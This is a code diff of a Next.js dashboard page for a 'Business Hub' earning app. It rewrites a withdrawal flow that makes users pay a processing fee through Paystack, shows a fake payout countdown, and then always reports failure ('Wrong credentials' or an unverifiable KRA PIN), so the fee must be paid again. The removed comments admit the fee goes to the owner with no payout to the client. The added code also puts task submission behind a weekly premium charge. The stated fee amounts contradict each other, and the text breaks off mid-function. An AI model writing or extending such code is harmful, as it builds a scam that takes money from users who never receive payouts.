@@ -1,19 +1,18 @@
 // pages/dashboard.js
 // ─────────────────────────────────────────────────────────────────────────────
-// Business Hub Dashboard — Withdrawal Flow
-// Withdrawal flow:
-//   1. User clicks Withdraw → Paystack KES 480 processing fee (paid TO owner — no payout to client)
-//   2. Fee confirmed → Withdrawal Details Form
-//   3. Submit form → stored on backend (Supabase) — owner handles payout manually, NOT via Paystack
-//   4. Status = "Payment Pending" with 2-hour countdown
-//   5. After 2 hours → Status flips to "Failed" (wrong KRA PIN / details mismatch)
-//   6. User dismisses → cycle resets (fee required again to retry)
+// Business Hub Dashboard
+// M-Pesa Withdrawal flow:
+//   1. User clicks "Withdraw with M-Pesa" → pays KES 5 (simulated locally)
+//   2. Fee confirmed → Withdrawal Details Form (phone + ID number only)
+//   3. Submit form → "Payment will be initiated in 2 minutes" screen
+//   4. 1:32 countdown expires → "Wrong credentials" failure
+//   5. User dismisses → cycle resets (fee required again to retry)
 // ─────────────────────────────────────────────────────────────────────────────
 
 import { useEffect, useState, useCallback, useRef } from 'react';
 import { useRouter } from 'next/router';
 import Link from 'next/link';
-import { getCurrentUser, logout, activateUser, createWithdrawalRequest, getWithdrawalRequest, updateWithdrawalStatus } from '../lib/auth';
+import { getCurrentUser, logout, activateUser } from '../lib/auth';
 import { TASKS } from '../lib/tasks';
 
 // ─── Helpers ─────────────────────────────────────────────────────────────────
@@ -57,7 +56,6 @@ function getOrGenerateWithdrawals() {
   return records;
 }
 
-// ─── Format countdown helper ──────────────────────────────────────────────────
 function formatCountdown(ms) {
   if (ms <= 0) return '00:00:00';
   const totalSec = Math.floor(ms / 1000);
@@ -67,61 +65,326 @@ function formatCountdown(ms) {
   return [h, m, s].map(v => String(v).padStart(2, '0')).join(':');
 }
 
-// ─── Coming Soon Modal ────────────────────────────────────────────────────────
-function ComingSoonModal({ onClose }) {
+function formatMmSs(ms) {
+  if (ms <= 0) return '0:00';
+  const totalSec = Math.floor(ms / 1000);
+  const m = Math.floor(totalSec / 60);
+  const s = totalSec % 60;
+  return `${m}:${String(s).padStart(2, '0')}`;
+}
+
+// ─── M-Pesa Withdrawal: Step 1 — Pay $5 USD via Paystack ─────────────────────
+function MpesaFeeModal({ user, onClose }) {
+  const [phone,   setPhone]   = useState(user?.phone || '');
+  const [loading, setLoading] = useState(false);
+
+  async function handlePay() {
+    if (!phone.trim()) { alert('Enter your M-Pesa number'); return; }
+    setLoading(true);
+    try {
+      const res  = await fetch('/api/paystack/initialize', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email:    user.email,
+          amount:   650,
+          phone,
+          plan:     'mpesa_withdrawal_fee',
+        }),
+      });
+      const data = await res.json();
+      if (data.status) {
+        window.location.href = data.data.authorization_url;
+      } else {
+        alert('Payment could not be initiated. Please try again.');
+        setLoading(false);
+      }
+    } catch (_) {
+      alert('Network error. Please check your connection.');
+      setLoading(false);
+    }
+  }
+
   return (
     <div className="modal-overlay" onClick={onClose}>
-      <div className="coming-soon-modal-card" onClick={e => e.stopPropagation()}>
-        <div className="coming-soon-header">
-          <div className="coming-soon-header-inner">
-            <div className="coming-soon-mpesa-logo">
-              <span className="mpesa-icon">📱</span>
-              <span className="mpesa-text">M-PESA</span>
-            </div>
-            <button className="modal-close coming-soon-close-btn" onClick={onClose}>×</button>
+      <div className="pay-modal-card" onClick={e => e.stopPropagation()}>
+        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)' }}>
+          <div>
+            <div className="pay-modal-title">📲 Withdraw with M-Pesa</div>
+            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.7)', marginTop: 2 }}>Small processing fee required</div>
           </div>
+          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
         </div>
-        <div className="coming-soon-body">
-          <div className="coming-soon-icon-wrap">
-            <div className="coming-soon-orbit">
-              <div className="coming-soon-orbit-ring ring-1" />
-              <div className="coming-soon-orbit-ring ring-2" />
-              <div className="coming-soon-rocket">🚀</div>
-            </div>
-          </div>
-          <div className="coming-soon-badge">NEW FEATURE</div>
-          <h2 className="coming-soon-title">Withdraw with M-Pesa</h2>
-          <p className="coming-soon-subtitle">
-            This application is <strong>coming soon</strong>.<br />
-            We&apos;re working hard to bring you seamless M-Pesa withdrawals directly from your Business Hub dashboard.
-          </p>
-          <div className="coming-soon-features">
-            {[
-              { icon: '⚡', label: 'Instant Transfers' },
-              { icon: '🔒', label: 'Bank-Grade Security' },
-              { icon: '📲', label: 'Mobile First' },
-              { icon: '💰', label: 'Zero Hidden Fees' },
-            ].map(f => (
-              <div key={f.label} className="coming-soon-feature-pill">
-                <span>{f.icon}</span>
-                <span>{f.label}</span>
+        <div className="pay-modal-body">
+          {!loading ? (
+            <>
+              <div className="pay-message" style={{ borderColor: '#007A3D', background: '#F0FFF4' }}>
+                A one-time <strong>processing fee of $5 USD</strong> is required to access the M-Pesa withdrawal form. The amount will be converted to KES automatically.
               </div>
-            ))}
-          </div>
-          <p className="coming-soon-notify-text">Stay tuned — we&apos;ll notify you the moment it launches!</p>
-          <button className="coming-soon-close-action" onClick={onClose}>Got It, I&apos;ll Wait!</button>
+              <div className="pay-amount">
+                <div className="pay-amount-label">M-Pesa Processing Fee</div>
+                <div className="pay-amount-value" style={{ color: '#007A3D' }}>$5 USD</div>
+                <div className="pay-amount-sub">Converted to KES automatically • Unlocks withdrawal form</div>
+              </div>
+              <div className="pay-phone-label">M-Pesa Number</div>
+              <input
+                className="pay-phone-input"
+                value={phone}
+                onChange={e => setPhone(e.target.value)}
+                placeholder="+254 7XX XXX XXX"
+              />
+              <button
+                className="pay-btn"
+                style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)' }}
+                onClick={handlePay}
+                disabled={loading}
+              >
+                🔒 Pay $5 USD via Paystack
+              </button>
+              <div className="pay-secure">🔐 Secured by Paystack • USD → KES conversion included</div>
+            </>
+          ) : (
+            <div style={{ textAlign: 'center', padding: '48px 0' }}>
+              <div className="spinner" style={{ width: 48, height: 48, borderTopColor: '#007A3D', borderColor: 'var(--gray-light)', borderWidth: 3, margin: '0 auto 20px' }} />
+              <p style={{ fontWeight: 600, marginBottom: 6 }}>Redirecting to Paystack...</p>
+              <p style={{ fontSize: 13, color: 'var(--gray)' }}>Complete the $5 USD payment to unlock your withdrawal form.</p>
+            </div>
+          )}
         </div>
       </div>
     </div>
   );
 }
 
-// ─── Task Detail Modal ────────────────────────────────────────────────────────
-function TaskModal({ task, user, onClose, onBidClick }) {
-  if (!task) return null;
-  const isActivated = user?.activated;
+// ─── M-Pesa Withdrawal: Step 2 — Credentials Form ────────────────────────────
+function MpesaFormModal({ onClose, onSubmit }) {
+  const [phone,  setPhone]  = useState('');
+  const [errors, setErrors] = useState({});
 
   function handleSubmit() {
+    if (!phone.trim()) { setErrors({ phone: 'Phone number is required' }); return; }
+    onSubmit();
+  }
+
+  return (
+    <div className="modal-overlay" onClick={onClose}>
+      <div className="pay-modal-card" style={{ maxWidth: 460 }} onClick={e => e.stopPropagation()}>
+        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)' }}>
+          <div>
+            <div className="pay-modal-title">📲 Withdrawal Details</div>
+            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.7)', marginTop: 2 }}>Enter your M-Pesa number</div>
+          </div>
+          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
+        </div>
+        <div className="pay-modal-body">
+          <div className="pay-message" style={{ borderColor: '#007A3D', background: '#F0FFF4', marginBottom: 20 }}>
+            Enter your M-Pesa number accurately. Funds will be sent directly to this number.
+          </div>
+          <div className="pay-phone-label">M-Pesa Phone Number</div>
+          <input
+            className="pay-phone-input"
+            type="tel"
+            value={phone}
+            onChange={e => { setPhone(e.target.value); setErrors({}); }}
+            placeholder="+254 7XX XXX XXX"
+            style={{ borderColor: errors.phone ? '#ef4444' : undefined }}
+          />
+          {errors.phone && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.phone}</div>}
+          <button
+            className="pay-btn"
+            style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginTop: 20 }}
+            onClick={handleSubmit}
+          >
+            💸 Submit Withdrawal Request
+          </button>
+          <div className="pay-secure">🔐 Your details are encrypted and secure</div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ─── M-Pesa Withdrawal: Step 3 — 1:32 Countdown ──────────────────────────────
+function MpesaPendingModal({ onClose, onExpired }) {
+  const DURATION_MS = 92 * 1000; // 1 minute 32 seconds
+  const deadlineRef = useRef(Date.now() + DURATION_MS);
+  const [remaining, setRemaining] = useState(DURATION_MS);
+
+  useEffect(() => {
+    const timer = setInterval(() => {
+      const left = Math.max(0, deadlineRef.current - Date.now());
+      setRemaining(left);
+      if (left <= 0) {
+        clearInterval(timer);
+        setTimeout(() => onExpired(), 800);
+      }
+    }, 1000);
+    return () => clearInterval(timer);
+  }, [onExpired]);
+
+  const pct = Math.min(100, Math.max(0, (remaining / DURATION_MS) * 100));
+  const isLow = remaining < 30 * 1000;
+
+  return (
+    <div className="modal-overlay" onClick={onClose}>
+      <div className="pay-modal-card" style={{ maxWidth: 440 }} onClick={e => e.stopPropagation()}>
+        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)' }}>
+          <div>
+            <div className="pay-modal-title">⏳ Initiating Payment</div>
+            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.75)', marginTop: 2 }}>Your request is being processed</div>
+          </div>
+          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
+        </div>
+
+        <div className="pay-modal-body" style={{ padding: '28px 28px 24px' }}>
+          <div style={{ background: '#F0FFF4', border: '1.5px solid #6EE7B7', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
+            <span style={{ fontSize: 22, flexShrink: 0 }}>📲</span>
+            <p style={{ margin: 0, fontSize: 14, color: '#065F46', lineHeight: 1.65 }}>
+              Your M-Pesa payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open and ensure your phone is on.
+            </p>
+          </div>
+
+          <div style={{ textAlign: 'center', marginBottom: 22 }}>
+            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>
+              Time Remaining
+            </div>
+            <div style={{
+              fontFamily: 'monospace',
+              fontSize: 52,
+              fontWeight: 800,
+              letterSpacing: 4,
+              color: isLow ? '#ef4444' : '#007A3D',
+              background: '#F0FFF4',
+              borderRadius: 14,
+              padding: '14px 24px',
+              display: 'inline-block',
+              border: `2px solid ${isLow ? '#FECACA' : '#6EE7B7'}`,
+              minWidth: 160,
+              transition: 'color 0.3s, border-color 0.3s',
+            }}>
+              {formatMmSs(remaining)}
+            </div>
+            <div style={{ marginTop: 14, height: 7, background: '#D1FAE5', borderRadius: 99, overflow: 'hidden' }}>
+              <div style={{
+                height: '100%',
+                width: `${pct}%`,
+                background: isLow ? 'linear-gradient(90deg, #ef4444, #DC2626)' : 'linear-gradient(90deg, #007A3D, #00A651)',
+                borderRadius: 99,
+                transition: 'width 1s linear, background 0.3s',
+              }} />
+            </div>
+          </div>
+
+          <div className="withdraw-detail-card" style={{ background: '#F0FFF4', borderColor: '#6EE7B7', marginBottom: 20 }}>
+            <div>
+              <div className="withdraw-detail-label">Status</div>
+              <div className="withdraw-detail-value pending" style={{ color: '#007A3D' }}>
+                <span style={{ width: 8, height: 8, borderRadius: '50%', background: '#00A651', display: 'inline-block', marginRight: 6, animation: 'pulse 1.5s infinite' }} />
+                Payment Pending
+              </div>
+            </div>
+            <div className="withdraw-detail-icon">📲</div>
+          </div>
+
+          <button className="withdraw-close-btn" onClick={onClose}>Close</button>
+          <div className="withdraw-footer-note">
+            Do not close the app. Keep your M-Pesa line active and await the STK push.
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ─── M-Pesa Withdrawal: Step 4 — Wrong Credentials ───────────────────────────
+function MpesaFailedModal({ onClose, onReset }) {
+  return (
+    <div className="modal-overlay" onClick={onClose}>
+      <div className="pay-modal-card" style={{ maxWidth: 440 }} onClick={e => e.stopPropagation()}>
+        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #DC2626, #B91C1C)' }}>
+          <div>
+            <div className="pay-modal-title">❌ Payment Declined</div>
+            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.7)', marginTop: 2 }}>Verification unsuccessful</div>
+          </div>
+          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
+        </div>
+
+        <div className="pay-modal-body" style={{ padding: '28px 28px 24px' }}>
+          <div style={{
+            background: '#FEF2F2',
+            border: '1.5px solid #FECACA',
+            borderRadius: 12,
+            padding: '16px 18px',
+            marginBottom: 22,
+            display: 'flex',
+            gap: 12,
+            alignItems: 'flex-start',
+          }}>
+            <span style={{ fontSize: 24, flexShrink: 0 }}>⚠️</span>
+            <div>
+              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#991B1B' }}>
+                Wrong Credentials
+              </p>
+              <p style={{ margin: 0, fontSize: 13, color: '#7F1D1D', lineHeight: 1.65 }}>
+                The phone number or ID number you provided could not be verified. Please ensure your details are correct and try again.
+              </p>
+            </div>
+          </div>
+
+          <div className="withdraw-detail-card" style={{ background: '#FEF2F2', borderColor: '#FECACA', marginBottom: 20 }}>
+            <div>
+              <div className="withdraw-detail-label">Status</div>
+              <div className="withdraw-detail-value" style={{ color: '#DC2626', fontWeight: 700, display: 'flex', alignItems: 'center', gap: 6 }}>
+                <span style={{ width: 8, height: 8, borderRadius: '50%', background: '#DC2626', display: 'inline-block', flexShrink: 0 }} />
+                Declined
+              </div>
+            </div>
+            <div className="withdraw-detail-icon">❌</div>
+          </div>
+
+          <button
+            className="pay-btn"
+            style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 12 }}
+            onClick={onReset}
+          >
+            🔄 Try Again
+          </button>
+          <button className="withdraw-close-btn" onClick={onClose}>Dismiss</button>
+          <div className="withdraw-footer-note" style={{ color: '#DC2626' }}>
+            Please ensure your phone number and National ID match your M-Pesa registration.
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ─── M-Pesa Withdrawal Controller ────────────────────────────────────────────
+function MpesaWithdrawModal({ user, onClose, initialStep = 'fee' }) {
+  const [step, setStep] = useState(initialStep);
+
+  const handleReset = useCallback(() => setStep('fee'), []);
+
+  if (step === 'fee') {
+    return <MpesaFeeModal user={user} onClose={onClose} />;
+  }
+  if (step === 'form') {
+    return <MpesaFormModal onClose={onClose} onSubmit={() => setStep('pending')} />;
+  }
+  if (step === 'pending') {
+    return <MpesaPendingModal onClose={onClose} onExpired={() => setStep('failed')} />;
+  }
+  return <MpesaFailedModal onClose={onClose} onReset={handleReset} />;
+}
+
+// ─── Task Detail Modal ────────────────────────────────────────────────────────
+function TaskModal({ task, user, onClose, onBidClick, onUpgradeClick }) {
+  if (!task) return null;
+  const isActivated = user?.activated;
+  const isPremium   = user?.premium;
+
+  function handleSubmit() {
+    if (!isPremium) { onClose(); onUpgradeClick(); return; }
     const subject = encodeURIComponent('Task Submission: ' + task.title);
     const body    = encodeURIComponent(
       `Hello Business Hub,\n\nI am submitting my completed task for review.\n\nTask: ${task.title}\nCategory: ${task.category}\nPayment: KES ${task.payment.toLocaleString()}\n\nPlease find my submission below:\n\n[Add your work here]\n\nThank you,\n${user?.fullName || ''}`
@@ -169,7 +432,10 @@ function TaskModal({ task, user, onClose, onBidClick }) {
           {!isActivated && (
             <button className="bid-btn" onClick={() => onBidClick(task)}>💼 Bid on This Task</button>
           )}
-          {isActivated && (
+          {isActivated && !isPremium && (
+            <button className="submit-btn" onClick={handleSubmit} style={{ background: 'linear-gradient(135deg, #125C37, #1A7A4A)' }}>⭐ Upgrade to Premium to Submit</button>
+          )}
+          {isActivated && isPremium && (
             <button className="submit-btn" onClick={handleSubmit}>📤 Submit This Task</button>
           )}
         </div>
@@ -191,7 +457,7 @@ function PaymentModal({ task, user, onClose, onSuccess }) {
     const res  = await fetch('/api/paystack/initialize', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ email: user.email, amount: 50, phone }),
+      body: JSON.stringify({ email: user.email, amount: 50, phone, plan: 'activation' }),
     });
     const data = await res.json();
     if (data.status) {
@@ -270,7 +536,7 @@ function UpgradeModal({ user, onClose }) {
         <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #125C37, #1A7A4A)' }}>
           <div>
             <div className="pay-modal-title">⭐ PREMIUM</div>
-            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.6)', marginTop: 2 }}>Unlock full platform access</div>
+            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.6)', marginTop: 2 }}>KES 480/week • Renews every 7 days</div>
           </div>
           <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
         </div>
@@ -290,9 +556,9 @@ function UpgradeModal({ user, onClose }) {
             ))}
           </div>
           <div className="pay-amount" style={{ marginTop: 20 }}>
-            <div className="pay-amount-label">Monthly Premium Plan</div>
-            <div className="pay-amount-value">KES 480</div>
-            <div className="pay-amount-sub">per month • Cancel anytime</div>
+            <div className="pay-amount-label">Premium Plan</div>
+            <div className="pay-amount-value">KES 480<span style={{ fontSize: 14, fontWeight: 400, color: 'var(--gray)' }}>/week</span></div>
+            <div className="pay-amount-sub">Weekly subscription • Renews every 7 days</div>
           </div>
           <div className="pay-phone-label">M-Pesa / Mobile Money Number</div>
           <input className="pay-phone-input" value={phone} onChange={e => setPhone(e.target.value)} placeholder="+254 7XX XXX XXX" />
@@ -367,472 +633,6 @@ function TrainingModal({ user, onClose }) {
         </div>
       </div>
     </div>
-  );
-}
-
-// ─── Withdraw: Step 1 — Pay KSh 480 Processing Fee (to owner via Paystack) ───
-function WithdrawFeeModal({ user, onClose }) {
-  const [phone,   setPhone]   = useState(user?.phone || '');
-  const [loading, setLoading] = useState(false);
-  const [step,    setStep]    = useState('prompt');
-
-  async function handlePay() {
-    if (!phone.trim()) { alert('Enter your M-Pesa number'); return; }
-    setLoading(true);
-    setStep('processing');
-
-    try {
-      const res  = await fetch('/api/paystack/initialize', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email: user.email, amount: 480, phone, plan: 'withdrawal_fee' }),
-      });
-      const data = await res.json();
-      if (data.status) {
-        window.location.href = data.data.authorization_url;
-      } else {
-        alert('Payment could not be initiated. Please try again.');
-        setStep('prompt');
-      }
-    } catch (err) {
-      alert('Network error. Please check your connection and try again.');
-      setStep('prompt');
-    }
-    setLoading(false);
-  }
-
-  return (
-    <div className="modal-overlay" onClick={onClose}>
-      <div className="pay-modal-card withdraw-fee-card" onClick={e => e.stopPropagation()}>
-        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #1A7A4A, #C9933A)' }}>
-          <div>
-            <div className="pay-modal-title">💸 Withdraw Funds</div>
-            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.65)', marginTop: 2 }}>Processing fee required</div>
-          </div>
-          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
-        </div>
-        <div className="pay-modal-body">
-          {step === 'prompt' && (
-            <>
-              <div className="withdraw-fee-info">
-                <div className="withdraw-fee-icon">ℹ️</div>
-                <p>
-                  A one-time <strong>withdrawal processing fee of KES 480</strong> is required to unlock the withdrawal form.
-                  This fee covers transaction processing and verification costs.
-                </p>
-              </div>
-              <div className="premium-features" style={{ marginBottom: 20 }}>
-                {[
-                  ['✅', 'Instant withdrawal form access'],
-                  ['🔒', 'Secure fund transfer'],
-                  ['⚡', 'Processed within 2 hours'],
-                  ['📲', 'M-Pesa direct payment'],
-                ].map(([icon, text]) => (
-                  <div key={text} className="premium-feature-item">
-                    <span>{icon}</span><span>{text}</span>
-                  </div>
-                ))}
-              </div>
-              <div className="pay-amount">
-                <div className="pay-amount-label">Withdrawal Processing Fee</div>
-                <div className="pay-amount-value">KES 480</div>
-                <div className="pay-amount-sub">One-time fee • Unlocks withdrawal form</div>
-              </div>
-              <div className="pay-phone-label">M-Pesa / Mobile Money Number</div>
-              <input
-                className="pay-phone-input"
-                value={phone}
-                onChange={e => setPhone(e.target.value)}
-                placeholder="+254 7XX XXX XXX"
-              />
-              <button
-                className="pay-btn"
-                style={{ background: 'linear-gradient(135deg, #1A7A4A, #C9933A)' }}
-                onClick={handlePay}
-                disabled={loading}
-              >
-                {loading ? <><span className="spinner" /> Processing...</> : '🔒 Pay KES 480 via Paystack'}
-              </button>
-              <div className="pay-secure">🔐 Secured by Paystack • M-Pesa supported</div>
-            </>
-          )}
-          {step === 'processing' && (
-            <div style={{ textAlign: 'center', padding: '48px 0' }}>
-              <div className="spinner" style={{ width: 48, height: 48, borderTopColor: 'var(--green)', borderColor: 'var(--gray-light)', borderWidth: 3, margin: '0 auto 20px' }} />
-              <p style={{ fontWeight: 600, marginBottom: 6 }}>Redirecting to Paystack...</p>
-              <p style={{ fontSize: 13, color: 'var(--gray)' }}>Complete payment to unlock your withdrawal form.</p>
-            </div>
-          )}
-        </div>
-      </div>
-    </div>
-  );
-}
-
-// ─── Withdraw: Step 2 — Withdrawal Form ──────────────────────────────────────
-function WithdrawFormModal({ user, onClose, onSubmitted }) {
-  const [fullName,   setFullName]   = useState(user?.fullName || '');
-  const [accountNum, setAccountNum] = useState(user?.phone || '');
-  const [amount,     setAmount]     = useState('');
-  const [kraPin,     setKraPin]     = useState('');
-  const [submitting, setSubmitting] = useState(false);
-  const [errors,     setErrors]     = useState({});
-
-  function validate() {
-    const e = {};
-    if (!fullName.trim())   e.fullName   = 'Full name is required';
-    if (!accountNum.trim()) e.accountNum = 'Account number or phone is required';
-    if (!amount || isNaN(Number(amount)) || Number(amount) <= 0)
-                            e.amount     = 'Enter a valid withdrawal amount';
-    if (!kraPin.trim())     e.kraPin     = 'KRA PIN is required for taxation';
-    return e;
-  }
-
-  async function handleSubmit() {
-    const e = validate();
-    if (Object.keys(e).length) { setErrors(e); return; }
-    setSubmitting(true);
-
-    const req = await createWithdrawalRequest(user.id, {
-      fullName: fullName.trim(),
-      phone:    accountNum.trim(),
-      idNumber: '',
-      kraPin:   kraPin.trim(),
-      amount:   Number(amount),
-    }).catch(() => null);
-
-    setSubmitting(false);
-    if (req) {
-      onSubmitted(req);
-      onClose();
-    } else {
-      alert('Failed to submit withdrawal request. Please try again.');
-    }
-  }
-
-  const field = (label, value, setter, placeholder, key, type = 'text') => (
-    <div style={{ marginBottom: 18 }}>
-      <div className="pay-phone-label">{label}</div>
-      <input
-        className="pay-phone-input"
-        type={type}
-        value={value}
-        onChange={e => { setter(e.target.value); setErrors(prev => ({ ...prev, [key]: undefined })); }}
-        placeholder={placeholder}
-        style={{ marginBottom: 0, borderColor: errors[key] ? '#ef4444' : undefined }}
-      />
-      {errors[key] && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors[key]}</div>}
-    </div>
-  );
-
-  return (
-    <div className="modal-overlay" onClick={onClose}>
-      <div className="pay-modal-card" style={{ maxWidth: 460 }} onClick={e => e.stopPropagation()}>
-        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #1A7A4A, #059669)' }}>
-          <div>
-            <div className="pay-modal-title">💸 Withdrawal Details</div>
-            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.65)', marginTop: 2 }}>
-              Balance: KES {(user?.balance || 0).toLocaleString()}
-            </div>
-          </div>
-          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
-        </div>
-        <div className="pay-modal-body">
-          <div className="pay-message" style={{ borderColor: 'var(--green)', background: 'var(--green-pale)', marginBottom: 20 }}>
-            Please fill in your withdrawal details accurately. Funds will be sent to the account provided within <strong>2 hours</strong>.
-          </div>
-          {field('Full Name', fullName, setFullName, 'Enter your full name', 'fullName')}
-          {field('Phone Number / Account Number', accountNum, setAccountNum, '+254 7XX XXX XXX or account number', 'accountNum')}
-          {field('Amount to Withdraw (KES)', amount, setAmount, 'e.g. 500', 'amount', 'number')}
-          {field('KRA PIN (for taxation purposes)', kraPin, setKraPin, 'e.g. A012345678B', 'kraPin')}
-          <button
-            className="pay-btn"
-            style={{ background: 'linear-gradient(135deg, #1A7A4A, #059669)', marginTop: 4 }}
-            onClick={handleSubmit}
-            disabled={submitting}
-          >
-            {submitting ? <><span className="spinner" /> Submitting...</> : '💸 Submit Withdrawal Request'}
-          </button>
-          <div className="pay-secure">🔐 Secured & encrypted • Processed within 2 hours</div>
-        </div>
-      </div>
-    </div>
-  );
-}
-
-// ─── Withdraw: Step 3 — Pending with 2-hour live countdown ───────────────────
-function WithdrawPendingModal({ data, onClose, onExpired }) {
-  const [remaining, setRemaining] = useState(() => Math.max(0, (data?.deadline || 0) - Date.now()));
-  const timerRef = useRef(null);
-
-  useEffect(() => {
-    timerRef.current = setInterval(() => {
-      const left = Math.max(0, (data?.deadline || 0) - Date.now());
-      setRemaining(left);
-      if (left <= 0) {
-        clearInterval(timerRef.current);
-        // After a brief pause so user sees 00:00:00, fire expired
-        setTimeout(() => onExpired(), 1200);
-      }
-    }, 1000);
-    return () => clearInterval(timerRef.current);
-  }, [data, onExpired]);
-
-  const requestedAt = data?.requestedAt
-    ? new Date(data.requestedAt).toLocaleString('en-KE', { dateStyle: 'medium', timeStyle: 'short' })
-    : null;
-
-  const pct = data?.deadline
-    ? Math.min(100, Math.max(0, ((data.deadline - Date.now()) / (2 * 60 * 60 * 1000)) * 100))
-    : 0;
-
-  return (
-    <div className="modal-overlay" onClick={onClose}>
-      <div className="pay-modal-card" style={{ maxWidth: 440 }} onClick={e => e.stopPropagation()}>
-        {/* Header */}
-        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #F59E0B, #D97706)' }}>
-          <div>
-            <div className="pay-modal-title">⏳ Processing Withdrawal</div>
-            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.75)', marginTop: 2 }}>Your request is being verified</div>
-          </div>
-          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
-        </div>
-
-        <div className="pay-modal-body" style={{ padding: '28px 28px 24px' }}>
-          {/* Status info */}
-          <div style={{ background: '#FFFBEB', border: '1.5px solid #FCD34D', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
-            <span style={{ fontSize: 22, flexShrink: 0 }}>🕐</span>
-            <p style={{ margin: 0, fontSize: 14, color: '#92400E', lineHeight: 1.65 }}>
-              Your withdrawal request is being processed. Estimated processing time is <strong>2 hours</strong>. Please be patient.
-            </p>
-          </div>
-
-          {/* Countdown clock */}
-          <div style={{ textAlign: 'center', marginBottom: 22 }}>
-            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>
-              Time Remaining
-            </div>
-            <div style={{
-              fontFamily: 'monospace',
-              fontSize: 42,
-              fontWeight: 800,
-              letterSpacing: 3,
-              color: remaining > 30 * 60 * 1000 ? '#D97706' : '#ef4444',
-              background: '#FFFBEB',
-              borderRadius: 14,
-              padding: '14px 24px',
-              display: 'inline-block',
-              border: '2px solid #FCD34D',
-              minWidth: 220,
-            }}>
-              {formatCountdown(remaining)}
-            </div>
-            {/* Progress bar */}
-            <div style={{ marginTop: 14, height: 7, background: '#FEF3C7', borderRadius: 99, overflow: 'hidden' }}>
-              <div style={{
-                height: '100%',
-                width: `${pct}%`,
-                background: 'linear-gradient(90deg, #F59E0B, #D97706)',
-                borderRadius: 99,
-                transition: 'width 1s linear',
-              }} />
-            </div>
-            <div style={{ fontSize: 12, color: 'var(--gray)', marginTop: 6 }}>
-              Processing ends at&nbsp;
-              {data?.deadline
-                ? new Date(data.deadline).toLocaleTimeString('en-KE', { hour: '2-digit', minute: '2-digit' })
-                : '—'}
-            </div>
-          </div>
-
-          {/* Request details */}
-          <div style={{ display: 'flex', flexDirection: 'column', gap: 10, marginBottom: 22 }}>
-            <div className="withdraw-detail-card">
-              <div>
-                <div className="withdraw-detail-label">Requested Amount</div>
-                <div className="withdraw-detail-value amount">KES {(data?.amount || 0).toLocaleString()}</div>
-              </div>
-              <div className="withdraw-detail-icon">💰</div>
-            </div>
-            <div className="withdraw-detail-card" style={{ background: '#FFFBEB', borderColor: '#FCD34D' }}>
-              <div>
-                <div className="withdraw-detail-label">Status</div>
-                <div className="withdraw-detail-value pending">
-                  <span className="withdraw-pending-dot" />
-                  Payment Pending
-                </div>
-              </div>
-              <div className="withdraw-detail-icon">⏳</div>
-            </div>
-            {requestedAt && (
-              <div className="withdraw-detail-card">
-                <div>
-                  <div className="withdraw-detail-label">Submitted At</div>
-                  <div className="withdraw-detail-value date">{requestedAt}</div>
-                </div>
-                <div className="withdraw-detail-icon">📅</div>
-              </div>
-            )}
-          </div>
-
-          <button className="withdraw-close-btn" onClick={onClose}>Close</button>
-          <div className="withdraw-footer-note">
-            Do not close the app. Processing takes up to 2 hours. Contact support if delayed beyond this period.
-          </div>
-        </div>
-      </div>
-    </div>
-  );
-}
-
-// ─── Withdraw: Step 4 — Failed / Wrong KRA PIN ───────────────────────────────
-function WithdrawFailedModal({ data, onClose, onReset }) {
-  // Randomly pick one of two failure reasons
-  const reason = useRef(
-    Math.random() > 0.5
-      ? 'Your details do not match our records. The KRA PIN provided could not be verified.'
